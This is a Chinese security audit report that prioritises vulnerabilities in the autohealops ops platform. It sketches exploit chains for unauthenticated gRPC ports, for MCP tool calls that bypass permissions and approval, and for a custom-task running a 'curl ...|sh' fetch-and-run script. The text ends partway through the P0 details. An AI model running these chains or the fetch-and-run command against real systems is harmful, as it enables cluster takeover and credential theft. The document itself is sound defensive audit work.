# 20 · 风险排序（Risk Priorities）

> 审计对象：`/Users/wolf/Documents/project/autohealops`　分支 `main`　HEAD `b3b9f03`
> 审计时点：2026-11-27　|　上游输入：`docs/architecture/audit/01~17` 共 17 份报告
> 本文件只做风险排序与优先级结论，不改代码/配置/依赖，不连生产，不做 git 写操作。

---

## 0. 结论摘要

1. **17 份报告合计 230 条问题**（此前口头预估「约 180 条」，实测为 230 条）：**P0=21、P1=66、P2=102、P3=41**。
2. **P0 的 21 条可归并为 17 个独立攻击面**，其中「未鉴权执行通道」（9090/9096/9100 三端口）与「应用层越权执行」（MCP / custom-tasks / batch）是两条**不依赖网络位置的完整绕过链**，危害最高。
3. **根因高度同源**：几乎所有 P0 都指向四个系统性缺陷——①「内网即安全」假设（端口裸奔）、②「请求参数 = 事实」假设（kind/namespace 自报、YAML 覆盖）、③「RBAC 有权限 = 可直接变更」（审批只覆盖 AI 链路）、④「共享密钥 = 安全」（内部令牌复用 JWT 签名密钥、默认 `change-me`）。
4. **修 P0 的顺序由依赖关系决定**：先「换密钥/根除共享密钥」→ 再「给内部通道上独立 mTLS/token」→ 再「收紧应用层授权 + 接入统一审批」。
5. 对外宣称「全链路审计可追溯」「经决策审批后自动执行」与现状严重不符（写操作审计覆盖率约 9%、审批只覆盖 AI 计划链路），见 §6。

---

## 1. 问题总表（按等级排序，P0→P3）

> 图例：「已复核」= 主审已重新读源码确认的条目（其余为分报告审计员结论，未二次复核）。
> 来源报告列写报告文件名简写（如 `05-k8s`）。

### P0（21 条）

| 编号 | 名称 | 来源报告 | 模块 | 已复核 |
|---|---|---|---|---|
| K8S-04 | 9096 内部网关无鉴权，可签发 agent 证书 + 下发任意 RPC | 05-k8s | Agent 网关 | ✅主审已复核 |
| AGT-01 | 内部网关 9096 无鉴权（签发证书/任意 RPC） | 06-agent | Agent 网关 | ✅主审已复核 |
| AGT-02 | agent 接入令牌明文写入 Deployment args，配合匿名 install.yaml 可劫持隧道 | 06-agent | Agent 接入 | — |
| SEC-03 | agent-gateway 9096 明文无鉴权 | 14-security | Agent 网关 | ✅主审已复核 |
| EXE-03 | k8s-executor gRPC 9090 无认证，compose 暴露宿主机 | 10-exec | 执行/K8s | ✅主审已复核 |
| SEC-02 | executor gRPC 9090 无鉴权 + reflection | 14-security | 执行/K8s | ✅主审已复核 |
| EXE-05 | agent pull NodePort 9100 令牌可空，权限 cluster-admin | 10-exec | Agent 接入 | — |
| EXE-02 | MCP tools/call 不校验角色/集群权限/审批 | 10-exec | AI/MCP | ✅主审已复核 |
| PERM-01 | MCP tools/call 绕过权限闸门与集群归属 | 13-perm | AI/MCP | ✅主审已复核 |
| PERM-02 | custom-tasks script 类型任意 shell（无授权/无审批） | 13-perm | 执行/定时 | ✅主审已复核 |
| EXE-01 | /batch 任意 operator 对任意集群执行任意计划 | 10-exec | 执行/批量 | — |
| EXE-04 | 资源变更 API 大量端点无审批（多数无审计） | 10-exec | 执行/K8s | — |
| K8S-01 | YAML metadata.namespace 覆盖鉴权 namespace，越权写 | 05-k8s | 资源/隔离 | ✅主审已复核 |
| K8S-02 | namespace 留空退化为集群级读，跨命名空间读取 | 05-k8s | 资源/隔离 | — |
| K8S-03 | Secret 数据解码明文返回给 read 用户 | 05-k8s | 资源/凭据 | ✅主审已复核 |
| DB-01 | 审核单 kind/action 自填，query 壳执行写操作 | 08-db | 数据库审核 | ✅主审已复核 |
| DB-02 | 审核无四眼，申请人自审自批 | 08-db | 数据库审核 | ✅主审已复核 |
| DB-03 | 只读限制仅靠首词白名单，可被 WITH/OUTFILE/FOR UPDATE 绕过 | 08-db | 数据库审核 | ✅主审已复核 |
| APP-01 | 加签/转办无操作人校验，自升级为审批人后自批 | 10-exec | 审批 | ✅主审已复核 |
| SEC-01 | registry/tags 反射 SSRF + 全局镜像仓库凭据外泄 | 14-security | 资源/仓库 | ✅主审已复核 |
| AUTH-02 | 默认部署密钥 change-me，可离线伪造 admin JWT | 11-auth | 认证/密钥 | — |

### P1（66 条）

| 编号 | 名称 | 来源报告 | 模块 | 已复核 |
|---|---|---|---|---|
| OPS-01 | compose 未注入 executor 日志流地址/未暴露 9099 | 01-ops | 部署/日志 | — |
| ARCH-01 | 两套部署拓扑不一致，Compose 下 Agent 隧道不可用 | 04-arch | 部署 | — |
| ARCH-02 | remote 网关模式存在绕过远端网关的直连调用（静默失效） | 04-arch | api-server | — |
| ARCH-03 | api-server 多副本后台循环每副本重复执行 | 04-arch | api-server | — |
| ARCH-04 | alerts 表两个写者（Python + Go），无单一写者约束 | 04-arch | 数据面 | — |
| K8S-05 | 节点级破坏性操作只校验「任意命名空间 operate」 | 05-k8s | 节点管理 | — |
| K8S-06 | K8s 破坏性操作无审批、绝大多数无审计 | 05-k8s | 资源/审计 | — |
| K8S-07 | 9099 日志流/产物无鉴权，可下载 JVM heapdump（含凭据） | 05-k8s | 日志/凭据 | — |
| K8S-08 | 告警列表/仪表盘不做用户过滤，跨租户泄露 | 05-k8s | 告警/隔离 | — |
| K8S-09 | 容器 exec 允许任意命令，无输出上限 | 05-k8s | 执行/K8s | — |
| K8S-10 | 多个集群级接口漏做集群权限校验 | 05-k8s | api-server | — |
| AGT-03 | mTLS 客户端证书未绑定集群身份，吊销不回收证书 | 06-agent | Agent PKI | — |
| AGT-04 | 平台超时后不取消 agent 侧执行，破坏性操作「看不见地」执行完 | 06-agent | Agent 任务 | — |
| AGT-05 | 单 agent 串行 + 无界队列，慢调用阻塞整集群 | 06-agent | Agent 运行时 | — |
| AGT-06 | 授权只在 api-server 层，agent/executor 零校验 | 06-agent | 授权模型 | — |
| AGT-07 | 云原生 RBAC impersonation 未接线，全部 cluster-admin SA 执行 | 06-agent | 授权模型 | — |
| AGT-08 | 破坏性操作无审计，隧道日志无用户身份 | 06-agent | 审计 | — |
| AGT-09 | pull 模式明文 channel + Bearer token 明文 | 06-agent | Agent 接入 | — |
| VM-01 | update_host 允许改写地址并绑定任意托管凭据（凭据挪用+横向） | 07-vm | 主机/授权 | — |
| VM-02 | SFTP 默认白名单含 /home，可读他人 SSH 私钥 | 07-vm | SFTP/文件 | — |
| VM-03 | 危险命令拦截可被历史回溯与 shell 语法绕过 | 07-vm | Web 终端 | — |
| VM-04 | 会话录像无完整性保护、可被关闭、短会话被删 | 07-vm | 会话录制 | — |
| DB-04 | 未配置只读账号时只读路径静默回落主账号 | 08-db | 数据源 | — |
| DB-05 | 整库备份任意 read 用户可用，无审批/审计/行数限制 | 08-db | 数据源/备份 | — |
| DB-06 | 结果集下载两条通道，/query/download 绕过开关与审批 | 08-db | 数据源/导出 | — |
| DB-07 | 多个写入口不查审核策略（/import、agent 建库/删库） | 08-db | 数据源/DDL | — |
| DB-08 | 直连执行无超时/LIMIT，缓冲游标整份读进内存 | 08-db | SQL 执行 | — |
| DB-09 | 审批执行与 5 类 DB 操作不写审计哈希链 | 08-db | 审计 | — |
| DB-10 | SQL 定时任务无审核、可发任意收件邮箱（数据外带） | 08-db | SQL 定时 | — |
| AI-01 | MCP tools/call 绕过工具权限闸门，任何登录用户执行 operate 工具 | 09-ai | AI/MCP | ✅主审已复核 |
| APP-02 | 审批单无申请人字段，无法实施职责分离 | 10-exec | 审批 | — |
| APP-03 | 双人审批可被同一人同时满足（交集判定） | 10-exec | 审批 | — |
| APP-04 | 已驳回/已取消计划可重新建审批单再次执行 | 10-exec | 审批 | — |
| APP-11 | 数据库审核单允许自批；策略默认全关闭（含删库） | 10-exec | 审批/DB | — |
| EXE-06 | custom-tasks 可建任意 shell 任务立即/定时执行 | 10-exec | 执行/定时 | ✅主审已复核 |
| EXE-07 | 一键回滚接口无审批、无集群权限校验 | 10-exec | 执行 | — |
| EXE-08 | 处置台 auto 路径直接执行业务变更 | 10-exec | 执行/告警 | — |
| EXE-09 | autonomy_gate 自动执行范围偏大（rollback/摘流/改 spec） | 10-exec | 授权策略 | — |
| EXE-10 | mode=full 可一键关闭全部审批，无二次确认/审计 | 10-exec | 授权策略 | — |
| EXE-11 | 执行步骤失败被吞，计划仍置 completed | 10-exec | 执行 | — |
| EXE-12 | 无可验证指标时直接关告警并标「未验证」 | 10-exec | 执行/验证 | — |
| AUTH-01 | 内部令牌复用 JWT 签名密钥，泄露=伪造任意用户 JWT | 11-auth | 认证/密钥 | ✅主审已复核 |
| AUTH-03 | /api/v1/ai/** 代理只校验登录，viewer 可改 AI 配置/投毒知识库 | 11-auth | 认证/AI | — |
| AUTH-04 | LDAP 登录绕过防爆破，限流只按用户名（可锁死账号） | 11-auth | 认证 | — |
| ISO-01 | 告警域（读+处置写）完全无项目/集群过滤 | 12-iso | 告警/隔离 | — |
| ISO-02 | namespace 空时授权失效，跨 namespace 读 | 12-iso | 授权 | — |
| ISO-03 | 执行明细/回滚接口无归属校验 | 12-iso | 执行/隔离 | — |
| ISO-04 | 数据库连接 3 端点漏 check_db_permission | 12-iso | 数据库/隔离 | — |
| ISO-05 | 项目详情三接口缺成员校验（IDOR） | 12-iso | 项目 | — |
| ISO-06 | AI 代理 /ai/logs/search 无集群/项目维度，跨租户读 ES | 12-iso | 日志/隔离 | — |
| PERM-03 | batch 接受任意 cluster_ids，把计划打到无授权集群 | 13-perm | 批量执行 | — |
| PERM-04 | apply_workload/apply_object_yaml 鉴权/执行 namespace 不一致，可跨命名空间写入 | 13-perm | 资源/隔离 | ✅主审已复核 |
| PERM-05 | 执行详情/回滚无归属校验 | 13-perm | 执行/回滚 | — |
| PERM-06 | 告警/审批/统计只读聚合接口无可见性过滤 | 13-perm | 告警/隔离 | — |
| PERM-07 | 数据库审核单可自批，建单不校验目标库授权 | 13-perm | 数据库审核 | — |
| SEC-04 | JWT 签名密钥复用为内部令牌，示例占位符、启动无校验 | 14-security | 密钥治理 | ✅主审已复核 |
| SEC-05 | JWT 经 URL query + localStorage，凭据易泄露 | 14-security | 前端/通道 | — |
| SEC-06 | logstream 9099 无鉴权，同网段可读任意 Pod 日志 | 14-security | 日志 | — |
| SEC-07 | LDAP 绕过防爆破；本地限流按用户名不按 IP | 14-security | 认证 | — |
| QUA-01 | 审批通过后执行存在 check-then-act 竞态，可能重复执行 | 15-quality | 审批/执行 | — |
| QUA-02 | 本地 executor gRPC unary 无 deadline，卡死挂满线程池 | 15-quality | gRPC 客户端 | — |
| TST-01 | 审批通过→执行核心链路 0 测试 + 并发重复执行风险 | 16-test | 测试 | — |
| TST-02 | 审计 SHA256 哈希链无任何测试 | 16-test | 测试/审计 | — |
| TST-03 | CI 不执行 go test，28 个 Go 用例形同虚设 | 16-test | CI | — |
| DEP-01 | k8s-executor 构建链 Go 版本矛盾（1.22 vs 1.26.6） | 17-dep | 构建 | ✅主审已复核 |
| DEP-02 | requirements.txt 漏声明 ldap3/dingtalk-stream/lark-oapi | 17-dep | 依赖 | — |

### P2（102 条）

| 编号 | 名称 | 来源报告 | 模块 | 已复核 |
|---|---|---|---|---|
| OPS-02 | README 默认账号表与代码行为不一致 | 01-ops | 文档 | — |
| TECH-01 | ai-service CORS `*` + allow_credentials=True | 02-tech | ai-service | — |
| TECH-02 | 内部鉴权复用 JWT_SECRET_KEY 作共享口令 | 02-tech | 服务间鉴权 | — |
| TECH-03 | Go 工具链三处不一致 | 02-tech | 构建 | ✅主审已复核 |
| MOD-01 | 资源中心单文件 2883 行/79 路由 | 03-mod | K8s 资源 | — |
| MOD-02 | 数据库模块单文件 2106 行/47 路由，跨 6 service 耦合 | 03-mod | 数据库 | — |
| MOD-03 | 无契约层：0 response_model、190 处 payload: dict | 03-mod | 架构 | — |
| MOD-04 | 前端零测试 + 权限校验口径不一致 | 03-mod | 前端 | — |
| MOD-05 | 测试密度与代码规模不匹配（28.7k 行 12 测试文件） | 03-mod | 测试 | — |
| ARCH-05 | k8s-executor 单副本硬约束，全局单点 | 04-arch | 部署 | — |
| ARCH-06 | agent-gateway 单副本 + RWO 卷，重启隧道全断 | 04-arch | Agent 网关 | — |
| ARCH-07 | executor 日志流 9099 无鉴权 | 04-arch | 日志 | — |
| ARCH-08 | 全局 gRPC 信号量把后台循环与用户请求同配额 | 04-arch | api-server | — |
| ARCH-09 | 内部鉴权复用 JWT 签名密钥作共享 token | 04-arch | 服务间通信 | ✅主审已复核 |
| ARCH-10 | pull/push 能力不对等，差异只写注释 | 04-arch | Agent 接入 | — |
| ARCH-11 | 隧道自定义 JSON 方法不在 proto 契约内 | 04-arch | Agent 协议 | — |
| ARCH-12 | schema 三方各自建模，无契约校验 | 04-arch | 数据面 | — |
| ARCH-13 | agent ClusterRole 过宽（*/* + impersonate） | 04-arch | Agent 权限 | — |
| K8S-11 | 「云原生 RBAC 已接入」名不副实（未接 impersonation） | 05-k8s | 授权 | — |
| K8S-12 | gRPC 无鉴权/TLS/大小上限/拦截器 | 05-k8s | executor | — |
| K8S-13 | 灰度发布完全未实现 | 05-k8s | 发布 | — |
| K8S-14 | 超时与并发治理缺陷（8 信号量+600s+30s+SSE） | 05-k8s | 治理 | — |
| K8S-15 | in-cluster 自动接入缺平台 RBAC 清单 | 05-k8s | 部署 | — |
| K8S-16 | kubeconfig 加密单把静态密钥，无轮换/KMS | 05-k8s | 凭据 | — |
| AGT-10 | CA 私钥明文 0600 落共享卷，无加密/备份 | 06-agent | Agent PKI | — |
| AGT-11 | ping/pong 与 last_seen 语义失效 | 06-agent | Agent 协议 | — |
| AGT-12 | 12 个 JSON 旁路方法不在 proto 契约，无能力门禁 | 06-agent | Agent 协议 | — |
| AGT-13 | 命令白名单只覆盖 ExecuteCommand 且比实现宽 | 06-agent | 执行层 | — |
| AGT-14 | agent 断线后状态机不可恢复 | 06-agent | 健康检查 | — |
| AGT-16 | AI 诊断助手 exec_in_pod 任意命令且无审计 | 06-agent | AI Agent | — |
| VM-05 | 命令审计缺退出码与输出关联 | 07-vm | 审计 | — |
| VM-06 | SSH 不做主机密钥校验 | 07-vm | SSH | — |
| VM-07 | 临时凭据通道任意用户名/密码尝试，不记身份 | 07-vm | Web 终端 | — |
| VM-08 | 凭据加密单一静态密钥，私钥字段长度不足 | 07-vm | 凭据 | — |
| VM-09 | agent 代采单私钥 + 明文 hosts.json + 不校验 host key | 07-vm | agent 采集 | — |
| VM-10 | 主机监控串行采集、维度单一 | 07-vm | 采集 | — |
| VM-11 | 服务/日志/非交互命令三项能力缺失 | 07-vm | 产品能力 | — |
| VM-12 | JWT/token 走 URL query | 07-vm | 认证 | — |
| DB-11 | 慢 SQL 采集固定主账号，与只读口径不一致 | 08-db | 采集 | — |
| DB-12 | 慢 SQL 明细每 30s 一轮 + 元数据探测，常态负载 | 08-db | 采集 | — |
| DB-13 | object-ddl/table-compare 缺连接级权限校验 | 08-db | 元数据 | — |
| DB-14 | Oracle sysdba/sysoper 角色沿用高权账号 | 08-db | Oracle | — |
| DB-15 | /query 白名单漏 with，CTE 不可用 | 08-db | 前端 | — |
| DB-16 | 审核单缺过期机制，download_token 列表回显 | 08-db | 审核 | — |
| AI-02 | 深诊白名单放行 exec_in_pod，AI 可自动写且无审批 | 09-ai | AI | — |
| AI-03 | 证据护栏只校验引文/异常类名，自由文本根因可无证据 | 09-ai | 证据校验 | — |
| AI-04 | 确定性结论规则写死、子串误判 | 09-ai | 降级收口 | — |
| AI-05 | ReAct 无重复调用检测，超时取消不中断线程化工具 | 09-ai | ReAct | — |
| AI-06 | Prompt 注入防护为软性声明 + 文本清洗 | 09-ai | Prompt | — |
| APP-05 | 定时执行到点不校验计划/告警当前状态 | 10-exec | 审批 | — |
| APP-06 | 审批无超时终态，末节点永久 pending | 10-exec | 审批 | — |
| APP-07 | approvers 为空旧数据跳过审批人校验 | 10-exec | 审批 | — |
| APP-08 | 审批列表/详情对所有登录用户可见 | 10-exec | 审批 | — |
| APP-09 | group_all 节点语义与实现不一致 | 10-exec | 审批 | — |
| APP-10 | 审批审计 trace_id 恒为空，创建记录无操作者 | 10-exec | 审批/审计 | — |
| EXE-13 | action_verify 验证口径映射错位，查询失败当成功 | 10-exec | 验证 | — |
| EXE-14 | 审批通过后执行无持久化/补偿，重启丢失 | 10-exec | 执行 | — |
| EXE-15 | 执行幂等/并发控制不完整 | 10-exec | 执行 | — |
| EXE-16 | 平台动作步骤不写 execution_logs，明细页空白 | 10-exec | 明细 | — |
| EXE-17 | 审计哈希链更新后断裂 | 10-exec | 审计 | — |
| EXE-18 | 审计字段不足（who/what/target/result/before-after） | 10-exec | 审计 | — |
| EXE-19 | 审计覆盖缺口（batch/dispatch/custom-tasks/MCP/资源变更） | 10-exec | 审计 | — |
| EXE-22 | executor 作为第二数据库写者，绕过 API 层权限审计 | 10-exec | 数据面 | — |
| EXE-23 | 审批未绑定计划内容摘要，plan_json 变更不可检测 | 10-exec | 参数完整性 | — |
| AUTH-05 | WebSocket 不校验登出黑名单，登出后仍可用 | 11-auth | 会话 | — |
| AUTH-06 | API Key 只生成不校验（空壳） | 11-auth | API Key | — |
| AUTH-07 | roles 表零调用方，角色硬编码字符串 | 11-auth | 授权模型 | — |
| AUTH-08 | 无密码强度策略，可建空密码账号 | 11-auth | 用户管理 | — |
| AUTH-09 | MCP 通道任意登录用户执行写工具 | 11-auth | MCP | — |
| AUTH-11 | JWT/Agent 令牌出现在 URL query + access log 未关 | 11-auth | 日志 | — |
| ISO-07 | 配置类 YAML namespace 文本扫描提取，flow-style 绕过 | 12-iso | 写操作 | — |
| ISO-08 | 审批/任务/审计/诊断/处理记录 6 类列表无范围过滤 | 12-iso | 隔离（读） | — |
| ISO-09 | 数据模型缺 project_id，全局对象无法归属 | 12-iso | 数据模型 | — |
| ISO-10 | 项目管理员无管理入口 | 12-iso | 项目权限 | — |
| PERM-08 | 审批权与操作权解耦，审批人无需目标集群权限 | 13-perm | 审批流 | — |
| PERM-09 | 诊断会话 read→operate 提权 | 13-perm | AI | — |
| PERM-10 | 写操作审计覆盖率约 9%（25 vs 285 写路由） | 13-perm | 审计 | — |
| PERM-11 | execute_tool 闸门只认自报 allow_operate，不用 user_id | 13-perm | AI 工具 | — |
| PERM-12 | approvers 为空既放行又回退自批 | 13-perm | 审批流 | — |
| PERM-13 | 内部 token 复用 JWT_SECRET_KEY | 13-perm | 服务间鉴权 | — |
| SEC-08 | 容器全部 root，镜像未固定 digest，无 securityContext | 14-security | 镜像/运行时 | — |
| SEC-09 | Redis 不可用黑名单降级放行，登出/踢人失效 | 14-security | 认证 | — |
| SEC-10 | ai-service CORS `*` + allow_credentials | 14-security | ai-service | — |
| QUA-03 | 全平台无请求/响应契约 | 15-quality | api 层 | — |
| QUA-04 | 巨型函数（2 个 >1000 行、12 个 >200 行） | 15-quality | 代码质量 | — |
| QUA-05 | SQL 切分算法整段复制 | 15-quality | 方言层 | — |
| QUA-06 | 137 处 except 只 pass，静默吞异常 | 15-quality | 全局 | — |
| QUA-07 | 时间列普遍缺索引 | 15-quality | 数据层 | — |
| QUA-08 | 进程级缓存/连接池无上限，随租户增长泄漏 | 15-quality | 全局 | — |
| QUA-09 | 分段 commit 为主，21+ 模块零 rollback | 15-quality | 全局 | — |
| QUA-10 | 启动日志打印默认管理员明文初始密码 | 15-quality | 启动 | — |
| TST-04 | 无覆盖率统计与门槛 | 16-test | CI | — |
| TST-05 | ai-service 测试环境与生产严重漂移 | 16-test | ai-service | — |
| TST-06 | 无集成/E2E 测试，HTTP 层仅 1 测试文件 | 16-test | 测试 | — |
| TST-07 | executor 危险写操作几乎无测试 | 16-test | executor | — |
| TST-10 | 前端 0 测试，终端类高危页面无保护 | 16-test | 前端 | — |
| DEP-03 | python-jose 3.3.0 CVE-2024-33663/33664 | 17-dep | 认证 | — |
| DEP-04 | 4 个服务镜像 root 运行，无 securityContext | 17-dep | 容器 | — |
| DEP-05 | 自建镜像 :latest，基础镜像浮动无 digest | 17-dep | 交付 | — |
| DEP-06 | 前端镜像忽略 lockfile | 17-dep | 前端 | — |
| DEP-07 | starlette 0.38.6 CVE-2024-47874（暂不可达） | 17-dep | Web 框架 | — |
| DEP-08 | cryptography 跨服务版本分裂（50.0.2/43.0.1） | 17-dep | 依赖 | — |

### P3（41 条）

| 编号 | 名称 | 来源报告 | 模块 |
|---|---|---|---|
| OPS-03 | README/CI Go 版本与 go.mod 不一致 | 01-ops | 构建/文档 |
| TECH-04 | /metrics 无鉴权暴露业务计数 | 02-tech | 可观测 |
| TECH-05 | 两套 executor.proto 靠 CI diff 保证一致 | 02-tech | 契约 |
| MOD-06 | 主机/VM 只有 SSH 纳管，VM 仅作标签 | 03-mod | VM |
| ARCH-14 | ping/pong 心跳帧死代码 | 04-arch | Agent 协议 |
| ARCH-15 | 迁移执行方式三形态不一致 | 04-arch | 发布 |
| ARCH-16 | 前端 30s 超时与后端长任务不匹配 | 04-arch | 契约 |
| K8S-17 | 缓存/限值零散一致性问题 | 05-k8s | 治理 |
| AGT-15 | agent/executor 无请求大小/频率限制 | 06-agent | 运行时 |
| VM-13 | 审计/录制读取权限过窄，安全角色无法自查 | 07-vm | 审计可见性 |
| VM-14 | 删除/清空缺二次确认与影响面提示 | 07-vm | 主机管理 |
| DB-17 | agent 库 PG 能力声明与实现不一致 | 08-db | agent DB |
| DB-18 | 导出/优化路径未校验标识符拼接 SQL 注入面 | 08-db | SQL 构造 |
| DB-19 | Oracle 客户端自定义 URL 下载（SSRF）+ 解压落盘 | 08-db | Oracle |
| DB-20 | 前端不按角色隐藏写操作入口 | 08-db | 前端 |
| DB-21 | command_guard DROP 规则只作用于 SSH 终端，SQL 通道无拦截 | 08-db | 命令拦截 |
| AI-07 | SINGLE_ALERT_COST_LIMIT 未实现 | 09-ai | 成本 |
| AI-08 | ai-service 鉴权复用 JWT 密钥 + CORS 全开（与 ARCH-09 重复） | 09-ai | 服务间安全 |
| EXE-20 | 内部令牌复用 JWT 签名密钥 | 10-exec | 内部回调 |
| EXE-21 | Pod 终端 JWT 放 URL query | 10-exec | 终端 |
| AUTH-10 | JWT 缺 iss/aud/jti，黑名单按完整 token 明文存 Redis | 11-auth | JWT |
| AUTH-12 | 无全局速率限制，/docs 与 /openapi.json 公开 | 11-auth | 暴露面 |
| ISO-11 | 仪表盘聚合接受任意 cluster_id/project_id | 12-iso | 统计 |
| PERM-14 | 若干小接口缺归属校验 | 13-perm | 数据库/项目 |
| PERM-15 | 巡检/auto-process 内部令牌比较、operator 触发全平台扫描 | 13-perm | 巡检 |
| SEC-11 | 初始账号明文密码进日志；备份脚本密码进命令行 | 14-security | 运维 |
| SEC-12 | 管理配置型 SSRF 面依赖「admin 可信」 | 14-security | 系统设置 |
| SEC-13 | 用户创建允许空密码；LDAP 用户 password_hash 空串 | 14-security | 用户管理 |
| SEC-14 | executor 命令字符串拼接依赖 Go 分词 | 14-security | K8s 操作 |
| QUA-11 | 3 处 httpx 无限超时 + 5 处 verify=False | 15-quality | 日志/监控 |
| QUA-12 | 通知重试无幂等键 | 15-quality | 通知 |
| QUA-13 | JSON 与文本日志混排，trace_id 常为空 | 15-quality | 日志 |
| QUA-14 | 前端单文件过大（api.ts 1455 行、SqlTerminal 1244 行） | 15-quality | 前端 |
| QUA-15 | 遗留产物/旧代码副本留在工作区 | 15-quality | 仓库卫生 |
| TST-08 | 测试留下未关闭 aiomysql 连接 | 16-test | 测试质量 |
| TST-09 | 测试用 skip 表达「无该动作」，实现变化后静默失效 | 16-test | 测试质量 |
| DEP-09 | Go 代理走 goproxy.cn，与 CI 源不一致 | 17-dep | 供应链 |
| DEP-10 | grpc_health_probe wget 下载无完整性校验 | 17-dep | 供应链 |
| DEP-11 | esbuild 0.21.5 GHSA-67mh-4wv8-2f99（仅 dev） | 17-dep | 前端 |
| DEP-12 | agent 镜像固定 GOARCH=amd64，与 executor 版本不一致 | 17-dep | agent 交付 |
| DEP-13 | 生产镜像含 grpcio-tools；容器启动即跑 alembic（root） | 17-dep | 镜像精简 |

---

## 2. P0 逐条展开（攻击前置条件 / 利用链 / 影响面 / 修复优先级）

> P0 共 21 条，归并为 17 个独立攻击面。归并关系：K8S-04≡AGT-01≡SEC-03（9096）；EXE-03≡SEC-02（9090）；EXE-02≡PERM-01（MCP）。同一攻击面的编号在标题内并列。

### P0-A　9096 agent-gateway 无鉴权（K8S-04 / AGT-01 / SEC-03）
- **前置条件**：攻击者能访问 agent-gateway 的 9096 端口（ClusterIP，平台集群内任意 Pod 可达；`k8s/networkpolicy.yaml` 未覆盖 agent-gateway）。
- **利用链**：集群内任意 Pod → `grpc.insecure_channel("agent-gateway:9096")` → `TunnelCall(cluster_id, "DeleteResource", payload)` → `agent_gateway.call` → 在线 agent 的 ExecutorService → 以 `*/*`+impersonate SA 执行；或 `IssueClientCert(cluster_id)` 现场签出合法客户端证书。
- **影响面**：对所有被管集群的完整控制（删资源、exec 任意 Pod、改工作负载）；mTLS 信任模型失效；全程无 api-server 审计。
- **修复优先级：24h**。9096 全方法加独立 `X-Internal-Token`/mTLS；`IssueClientCert` 拆独立 admin-only 通道；补 NetworkPolicy。

### P0-B　9090 executor gRPC 无鉴权（EXE-03 / SEC-02）
- **前置条件**：能连 executor 9090（compose `"9090:9090"` 暴露宿主机全网卡；本地 start.sh 监听 0.0.0.0；k8s 依赖 CNI 强制执行 NetworkPolicy）。
- **利用链**：任意进程 → `grpcurl -plaintext host:9090 list`（reflection 自描述）→ `DeleteResource/ExecuteCommand/RunScript/ScaleWorkload` → client-go 直连集群。
- **影响面**：拿到 executor = 拿到所有直连集群 cluster-admin（可删 namespace、exec 任意 Pod）；反射开启使攻击面自描述。
- **修复优先级：24h**。加 token/mTLS 拦截器；关 reflection；compose 改 `expose`；默认监听 127.0.0.1。

### P0-C　agent pull 模式 NodePort 9100（EXE-05）
- **前置条件**：安装模板默认创建 NodePort Service；agent 侧 pull-token 为空时 `pullAuthOK` 直接放行；未配证书时明文。
- **利用链**：外部 → NodePort 9100 → agent bridge 暴露的完整 ExecutorService（含 ExecuteCommand/ExecutePlan）→ 集群 API（cluster-admin）。
- **影响面**：单个被管集群被完全接管。
- **修复优先级：24h**。pull-token 强制非空且随机；默认 ClusterIP/TLS；限制 bridge 方法白名单。

### P0-D　MCP tools/call 越权执行（EXE-02 / PERM-01）
- **前置条件**：任意登录用户（含 viewer/developer）可访问 `/mcp`；`tools/call` 直接 `td["handler"](args)`，cluster_id 由调用方自报。
- **利用链**：`POST /mcp {method:"tools/call", name:"exec_in_pod", arguments:{cluster_id:任意, command:"id"}}` → `_h_exec_in_pod` → `executor_client.exec_in_pod` → 容器内执行。
- **影响面**：viewer 即可在任意 Pod 内执行命令（读挂载 Secret、拿到 SA token 横向），等效拿到被管集群凭据；多租户隔离旁路；无审计。
- **修复优先级：24h**。改走 `execute_tool` 统一门面 + `check_cluster_permission`；写类工具默认禁用。

### P0-E　custom-tasks 任意 shell（PERM-02；EXE-06 为同一链路的 P1 侧）
- **前置条件**：`operator` 角色（非 admin）即可建任务；payload 的 cluster_id/script_content 原样落库执行。
- **利用链**：`POST /api/v1/custom-tasks {cluster_id:任意, task_type:"script", script_content:"curl ...|sh"}` → `run-now` 立即或 cron 到点 → `run_script` → executor 起 Job `/bin/sh -c`。
- **影响面**：非 admin 在任意集群以平台身份跑任意代码 → 集群权限提升；可设 cron 长期驻留；无审计。
- **修复优先级：24h**。创建+执行前 `check_cluster_permission`；script 类型默认关闭 + 双人审批；结果落审计。

### P0-F　/batch 越权批量执行（EXE-01）
- **前置条件**：`operator` 角色；`create_batch` 接受任意 cluster_ids + plan_id。
- **利用链**：`POST /api/v1/batch` → `/{id}/execute` → 直接读 RepairPlan.plan_json → 逐集群 `execute_plan`（无审批状态校验、无集群权限、无审计）。
- **影响面**：把「待审批」计划提前执行；越权对生产集群批量删除/回滚；无留痕。
- **修复优先级：72h**。要求审批 approved 且未执行；逐集群 check_cluster_permission；写审计。

### P0-G　资源变更 API 无审批（EXE-04）
- **前置条件**：`operator` + `_deny_cluster(operate)` 即放行（审批只在 AI 计划链路生效）。
- **利用链**：前端集群管理 → `DELETE /workloads/...`、scale 到 0、rollout/rollback、node cordon/drain 等 → `executor_client.*` 直接下发。
- **影响面**：有 operate 权限者绕过审批直接删生产工作负载/排空节点，且无审计（resources.py 全文件仅 3 处 audit）。
- **修复优先级：1 周**。高风险动词接入统一审批（或至少二次确认+审计）；这是「Action Gateway」改造的主体。

### P0-H　YAML namespace 覆盖越权写（K8S-01）
- **前置条件**：用户在 A 命名空间有 operate；YAML 内 `metadata.namespace=B`。
- **利用链**：`apply_workload(ns=A, yaml 内含 ns=B)` → `_deny_cluster` 按 A 通过 → Go 侧 `obj.GetNamespace()=B` 覆盖 → 在 B 创建/改 Deployment/Secret/ConfigMap/ServiceAccount。
- **影响面**：租户/项目横向越权写；篡改他人 Secret/镜像/sidecar；写后读回凭据。
- **修复优先级：72h**。Go 侧 namespace 不一致直接报错；Python 统一按「解析后对象 namespace」鉴权；禁携带不一致 namespace。
- **注**：PERM-04（apply_workload/apply_object_yaml 鉴权用请求体、执行用 YAML namespace）为同一根因的 P1 侧，随本项一并修复。

### P0-I　namespace 留空退化为集群级读（K8S-02）
- **前置条件**：用户只被授权单一命名空间；接口默认 `namespace=""`。
- **利用链**：`check_cluster_permission(user, id, "", "read")` → 「任意 ns 授权即 True」→ executor 全量 list（`metav1.NamespaceAll`）。
- **影响面**：跨租户信息泄露（Pod/工作负载/Secret 名称/节点/SA），为定向攻击提供资产清单。
- **修复优先级：72h**。拆分 cluster_access 与 namespace_access；列表接口下推「可见 ns 集合」。

### P0-J　Secret 明文返回（K8S-03）
- **前置条件**：`viewer` 即可（`_deny_cluster(..., "read")`）。
- **利用链**：`GET objects/secret/{ns}/{name}/yaml` → `revealSecretData` 把 base64 解码成明文 stringData → 返回前端（无二次确认/审批/审计）。
